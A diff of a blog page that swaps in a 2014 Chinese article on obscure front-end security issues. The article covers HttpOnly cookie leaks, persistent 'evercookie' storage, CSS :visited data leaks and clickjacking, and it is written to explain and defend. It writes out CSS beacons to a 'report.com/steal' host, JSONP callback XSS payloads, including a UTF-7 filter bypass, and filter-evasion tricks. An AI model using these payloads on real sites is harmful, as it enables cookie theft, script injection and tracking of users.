@@ -6,18 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>赤子的博客</title>
+  <title>前端安全冷门知识杂谈 | 赤子的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="想的太多，做的太少">
-<meta property="og:type" content="website">
-<meta property="og:title" content="赤子的博客">
-<meta property="og:url" content="http://yoursite.com/index.html">
+  <meta name="description" content="零、概述提起web前端安全，大家都会想到两个名词：xss和csrf。抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。大概分为以下章节：  盗取无法用js读写的Cookie删不掉的本地存储函数覆写监听上报内存Cookie与硬盘CookieCSS带来的点击量泄露JSONP回调函数与UTF-7编码过滤与代码混淆心理学与社会工程学                    资料">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端安全冷门知识杂谈">
+<meta property="og:url" content="http://yoursite.com/2014/05/27/safety-point-of-view-from-front-end/index.html">
 <meta property="og:site_name" content="赤子的博客">
-<meta property="og:description" content="想的太多，做的太少">
+<meta property="og:description" content="零、概述提起web前端安全，大家都会想到两个名词：xss和csrf。抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。大概分为以下章节：  盗取无法用js读写的Cookie删不掉的本地存储函数覆写监听上报内存Cookie与硬盘CookieCSS带来的点击量泄露JSONP回调函数与UTF-7编码过滤与代码混淆心理学与社会工程学                    资料">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/safety_001.jpg">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/safety_002.jpg">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/safety_003.jpg">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/safety_004.jpg">
+<meta property="og:image" content="http://yoursite.com/assets/blogImg/safety_005.jpg">
+<meta property="og:updated_time" content="2019-01-17T01:44:08.074Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="赤子的博客">
-<meta name="twitter:description" content="想的太多，做的太少">
+<meta name="twitter:title" content="前端安全冷门知识杂谈">
+<meta name="twitter:description" content="零、概述提起web前端安全，大家都会想到两个名词：xss和csrf。抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。大概分为以下章节：  盗取无法用js读写的Cookie删不掉的本地存储函数覆写监听上报内存Cookie与硬盘CookieCSS带来的点击量泄露JSONP回调函数与UTF-7编码过滤与代码混淆心理学与社会工程学                    资料">
+<meta name="twitter:image" content="http://yoursite.com/assets/blogImg/safety_001.jpg">
   
     <link rel="alternative" href="/atom.xml" title="赤子的博客" type="application/atom+xml">
   
@@ -157,35 +165,105 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-diary-2019-0119-1530" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+            <article id="post-safety-point-of-view-from-front-end" class="article article-type-post " itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/19/diary-2019-0119-1530/">周自兴初见</a>
+    <h1 class="article-title" itemprop="name">
+      前端安全冷门知识杂谈
     </h1>
   
 
         
-        <a href="/2019/01/19/diary-2019-0119-1530/" class="archive-article-date">
-  	<time datetime="2019-01-19T07:30:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-19</time>
+        <a href="/2014/05/27/safety-point-of-view-from-front-end/" class="archive-article-date">
+  	<time datetime="2014-05-27T15:52:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2014-05-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="/assets/blogImg/diary-23.jpg" width="500"></p>
-
-<h3 id="雨中餐"><a href="#雨中餐" class="headerlink" title="雨中餐"></a>雨中餐</h3><p>中午雨大，临河就餐<br>专门要了不明就里的两味菜：丁莲芳千张包子、绣花锦。</p>
-<p>—— 赤子 1.9</p>
+        <h3 id="零、概述"><a href="#零、概述" class="headerlink" title="零、概述"></a>零、概述</h3><p>提起web前端安全，大家都会想到两个名词：<code>xss</code>和<code>csrf</code>。<br>抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。<br>大概分为以下章节：</p>
+<blockquote>
+<p>盗取无法用js读写的Cookie<br>删不掉的本地存储<br>函数覆写监听上报<br>内存Cookie与硬盘Cookie<br>CSS带来的点击量泄露<br>JSONP回调函数与UTF-7编码<br>过滤与代码混淆<br>心理学与社会工程学                  </p>
+</blockquote>
+<p>资料略多，文章较长，请自备瓜子…<br><a id="more"></a></p>
+<h3 id="一、盗取无法用js读写的Cookie"><a href="#一、盗取无法用js读写的Cookie" class="headerlink" title="一、盗取无法用js读写的Cookie"></a>一、盗取无法用js读写的Cookie</h3><p>为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&quot;test&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0); // 设置普通Cookie</span><br><span class="line">setcookie(&quot;test_http&quot;, 1, time()+3600, &quot;&quot;, &quot;&quot;, 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启</span><br></pre></td></tr></table></figure></p>
+<p>我们还是可以通过一些服务器上的漏洞去获取它们。</p>
+<h4 id="2-1-调试信息泄露"><a href="#2-1-调试信息泄露" class="headerlink" title="2.1) 调试信息泄露"></a>2.1) 调试信息泄露</h4><p>比较经典的是PHP的phpinfo文件：<br><img src="/assets/blogImg/safety_001.jpg" alt="phpinfo文件"><br>如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。<br>访问phpinfo.php，将看到：<br><img src="/assets/blogImg/safety_002.jpg" alt="Alt text"><br>其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。                  </p>
+<h4 id="2-2-Apache-2-2-x版本请求头超长泄露"><a href="#2-2-Apache-2-2-x版本请求头超长泄露" class="headerlink" title="2.2) Apache 2.2.x版本请求头超长泄露"></a>2.2) Apache 2.2.x版本请求头超长泄露</h4><p>Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。<br>因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。<br><img src="/assets/blogImg/safety_003.jpg" alt="Alt text">                    </p>
+<h3 id="三、删不掉的本地存储"><a href="#三、删不掉的本地存储" class="headerlink" title="三、删不掉的本地存储"></a>三、删不掉的本地存储</h3><p>如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且”永久”寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。<br>但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：</p>
+<blockquote>
+<p>Cookie - 是最常见的方式，key-value 模式<br>UserData - IE自己的本地存储，key-value 模式<br>localStorage - HTML5 新增的本地存储，key-value 模式<br>local Database -  HTML5 新增的浏览器本地DataBase，是SQLite 数据库<br>Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器                   </p>
+</blockquote>
+<p>除去这些，我还收集了一些比较“偏门”的存储方案：          </p>
+<blockquote>
+<p>Silverlight的IsolatedStorage - 类似HTML5 localStorage<br>PNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值<br>HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容<br>Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）<br>window.name，本质就是一个DOM 存储，并不存在本地。                   </p>
+</blockquote>
+<p>老外Samy Kamkar用半天开发了一个JavaScript API：<a href="http://en.wikipedia.org/wiki/Evercookie" target="_blank" rel="noopener">evercookie</a>。<br>该API利用了上面的全部存储手段，将“<code>永不丢失你的cookie</code>”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。</p>
+<h3 id="四、函数覆写监听上报"><a href="#四、函数覆写监听上报" class="headerlink" title="四、函数覆写监听上报"></a>四、函数覆写监听上报</h3><p>覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：<code>搞跨站的人总习惯用alert来确认是否已成功跨站</code>，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function log(s) &#123;</span><br><span class="line">    var img = new Image();</span><br><span class="line">    img.src = &quot;http://yousite.com/log.php?caller=&quot; + encodeURIComponent(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var _alert = alert;</span><br><span class="line">window.alert = function(s) &#123;</span><br><span class="line">    log(alert.caller);</span><br><span class="line">    _alert(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…<br>其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《<a href="http://www.xfocus.net/articles/200712/963.html" target="_blank" rel="noopener">浅谈javascript函数劫持</a>》。</p>
+<h3 id="五、内存Cookie与硬盘Cookie"><a href="#五、内存Cookie与硬盘Cookie" class="headerlink" title="五、内存Cookie与硬盘Cookie"></a>五、内存Cookie与硬盘Cookie</h3><p><code>内存Cookie</code> - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁<br><code>硬盘Cookie</code> - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期</p>
+<p>我们很容易得出结论：内存Cookie更安全。因此，某些站点会把<code>敏感信息放到内存Cookie</code>里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。                  </p>
+<p>因此，这里有两个关注点：                 </p>
+<ol>
+<li>敏感信息还是不要放Cookie里，即使是内存Cookie；              </li>
+<li>服务器要做Cookie的三个维度的校验 -  唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。               </li>
+</ol>
+<h3 id="六、CSS带来的点击量泄露"><a href="#六、CSS带来的点击量泄露" class="headerlink" title="六、CSS带来的点击量泄露"></a>六、CSS带来的点击量泄露</h3><p>在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。<br>假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。<br>试想这是一个<code>导航栏组件</code>，html代码是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://yousite.com/a1&quot; id=&quot;a1&quot;&gt;nav1&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://yousite.com/a2&quot; id=&quot;a2&quot;&gt;nav2&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;http://yousite.com/a3&quot; id=&quot;a3&quot;&gt;nav3&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
+<p>你忽略掉的css写成这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#a1:visited &#123;background: url(http://report.com/steal?data=a1);&#125;</span><br><span class="line">#a2:visited &#123;background: url(http://report.com/steal?data=a2);&#125;</span><br><span class="line">#a3:visited &#123;background: url(http://report.com/steal?data=a3);&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的<code>点击数据量</code>就暴露给第三方了！<br>当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…<br>HTML5提供伪类<code>::selection</code>，当指定对象区域被选择时，就会触发。其原理跟上面类似。                         </p>
+<h3 id="七、JSONP回调函数与UTF-7编码"><a href="#七、JSONP回调函数与UTF-7编码" class="headerlink" title="七、JSONP回调函数与UTF-7编码"></a>七、JSONP回调函数与UTF-7编码</h3><h4 id="7-1-基本原理"><a href="#7-1-基本原理" class="headerlink" title="7.1) 基本原理"></a>7.1) 基本原理</h4><p>在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=some_function</code><br>返回数据格式为：<br><code>some_function([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br>如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。<br>请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;</code><br>返回：<br><code>&lt;script&gt;alert(1);&lt;/script&gt;([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br>所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？                              </p>
+<h4 id="7-2-IE解析UTF-7漏洞"><a href="#7-2-IE解析UTF-7漏洞" class="headerlink" title="7.2) IE解析UTF-7漏洞"></a>7.2) IE解析UTF-7漏洞</h4><p>比较简单的过滤方法，是过滤<code>&lt;&gt;</code>字符，使得无法构成html标签。但在IE6\IE7的某些版本中，存在以下漏洞：<strong>如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析</strong>（IE7后续版本已发布补丁修复）。<br>在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上”+/v8”头：<br><code>cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4</code><br>这时候巧妙的躲开了<code>&lt;&gt;</code>过滤，而返回：<br><code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’});</code><br>这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。                       </p>
+<h3 id="八、过滤与代码混淆"><a href="#八、过滤与代码混淆" class="headerlink" title="八、过滤与代码混淆"></a>八、过滤与代码混淆</h3><p>过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：<a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">jsfuck</a>。<br>站名如其名，满满的恶意…它可以仅仅用6个字符：<code>[]()!+</code>去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句<code>alert(1)</code>编码成了3009个字符，并执行成功：<br><img src="/assets/blogImg/safety_004.jpg" alt="Alt text"><br>所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。</p>
+<h3 id="九、心理学与社会工程学"><a href="#九、心理学与社会工程学" class="headerlink" title="九、心理学与社会工程学"></a>九、心理学与社会工程学</h3><p>有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：</p>
+<h4 id="9-1）诱导触发拖拽事件"><a href="#9-1）诱导触发拖拽事件" class="headerlink" title="9.1）诱导触发拖拽事件"></a>9.1）诱导触发拖拽事件</h4><p>比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？<br>很简单，添加一张图片：<br><img src="/assets/blogImg/safety_005.jpg" alt="Alt text"><br>注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。</p>
+<h4 id="9-2-传说中的QQ空间“传染病毒”"><a href="#9-2-传说中的QQ空间“传染病毒”" class="headerlink" title="9.2) 传说中的QQ空间“传染病毒”"></a>9.2) 传说中的QQ空间“传染病毒”</h4><p>步骤是这样的：                    </p>
+<ol>
+<li>A(始作俑者)发布了一条说说：<code>这个网站很好玩，快来试试吧~ http://xxx.xxx</code>                     </li>
+<li>A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面                     </li>
+<li>好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）                     </li>
+<li>一传十十传百，越传越广…                     </li>
+</ol>
+<p>但真实的情况跟CSRF没一点关系。玄妙在于：<code>好友们打开链接后干了什么事情？</code><br>这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？<br>用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…                     </p>
+<p>有人会问，这不是CSRF吗？还真不是。做法却很简单：<br>“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是<code>点击了iframe中的转发按钮</code>。真是令人万万没想到。                     </p>
+<p>以上。<br>End. 5.27 by litten.                                           </p>
 
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感恩你的雨露均沾<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/wepay.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -196,7 +274,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">旧事</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
         		</li>
       		
 		</ul>
@@ -205,16 +283,84 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/19/diary-2019-0119-1530/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2014/05/27/safety-point-of-view-from-front-end/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2014/07/25/folder-to-tree/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          一个文件夹的自我介绍
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/03/30/volunteer-activities/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">小朋友，跟你谈谈印象派</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -234,724 +380,40 @@
 
 
 
-
-  
-    <article id="post-第一篇" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/09/第一篇/">第一篇</a>
-    </h1>
-  
-
-        
-        <a href="/2019/01/09/第一篇/" class="archive-article-date">
-  	<time datetime="2019-01-09T07:40:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/09/第一篇/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-prevent-spiders" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/09/prevent-spiders/">反击爬虫，前端工程师的脑洞可以有多大？</a>
-    </h1>
-  
-
-        
-        <a href="/2017/07/09/prevent-spiders/" class="archive-article-date">
-  	<time datetime="2017-07-09T02:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="http://7tszky.com1.z0.glb.clouddn.com/FmIvXiOiFFET4oPGkVU6rdDCl87S" width="400"></p>
-
-<p><em>—— 同时发表于<a href="http://imweb.io/topic/595b7161d6ca6b4f0ac71f05" target="_blank" rel="noopener">imweb.io</a></em></p>
-<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h3><p>对于一张网页，我们往往希望它是结构良好，内容清晰的，这样搜索引擎才能准确地认知它。<br>而反过来，又有一些情景，我们不希望内容能被轻易获取，比方说电商网站的交易额，教育网站的题目等。因为这些内容，往往是一个产品的生命线，必须做到有效地保护。这就是<strong>爬虫与反爬虫</strong>这一话题的由来。</p>
-        
-          <a class="article-more-a" href="/2017/07/09/prevent-spiders/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/07/09/prevent-spiders/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-my-fairy-tale4" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/06/05/my-fairy-tale4/">失眠故事五【花匠与候鸟】</a>
-    </h1>
-  
-
-        
-        <a href="/2017/06/05/my-fairy-tale4/" class="archive-article-date">
-  	<time datetime="2017-06-04T19:55:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/assets/blogImg/diary-29.jpg" alt="Picture by Matt Carlson"></p>
-<h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><p>每个春天，候鸟都会来到这片花田。<br>每个不是春天的季节，花匠总在认真地打理花田。花匠想让一切看起来未来可期，因为他喜欢这只候鸟。喜欢，是因为他们都爱花。那些关于花的话题，他们永远聊不完。</p>
-<p>有一个春天，候鸟跟花匠说起了她家乡的雪莲。<br>这种花，花匠从来没听说过。但每次说起雪莲，花匠都能注意到她眼中飞扬的光亮。是的，那是候鸟最心爱的花儿。</p>
-        
-          <a class="article-more-a" href="/2017/06/05/my-fairy-tale4/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">故事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/05/my-fairy-tale4/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-diary-2017-0521-0527" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/05/22/diary-2017-0521-0527/">江南见闻</a>
-    </h1>
-  
-
-        
-        <a href="/2017/05/22/diary-2017-0521-0527/" class="archive-article-date">
-  	<time datetime="2017-05-22T02:36:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><img src="/assets/blogImg/diary-23.jpg" width="500"></p>
-
-<h3 id="扬起帆"><a href="#扬起帆" class="headerlink" title="扬起帆"></a>扬起帆</h3><p>这个4月真的特别丧…<br>开心的事情屈指可数，貌似也只有朴树的新专辑了。</p>
-<p>病后状态一直不好，工作时脑后阴风习习<br>bug，变成了巨大的飞蛾，每每衔着灵魂四方飘游。<br>周四晚，无耻地逃了一个会议<br>下班，拖着疲惫的身体，径直就飞往了杭州。</p>
-<p>都这么累了，问自己为什么又在路上了呢？<br>可能只是我觉得，旅行的时候不用去想以前和以后。<br>但旅行那么短，而生活那么长<br>那就更应该不停的出发吧？即使只是一场短暂的幻觉。</p>
-<p>我这么想着的时候，这场幻觉正变得越来越真实。<br>凌晨让头脑额外清醒，飞机下出现了新城<br>灯火穿透了夜色与云层，越来越浓，背后的飞蛾被引诱扑了下去——<br>烟消云散。</p>
-        
-          <a class="article-more-a" href="/2017/05/22/diary-2017-0521-0527/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">旧事</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/05/22/diary-2017-0521-0527/">展开全文 >></a>
-        </p>
-      
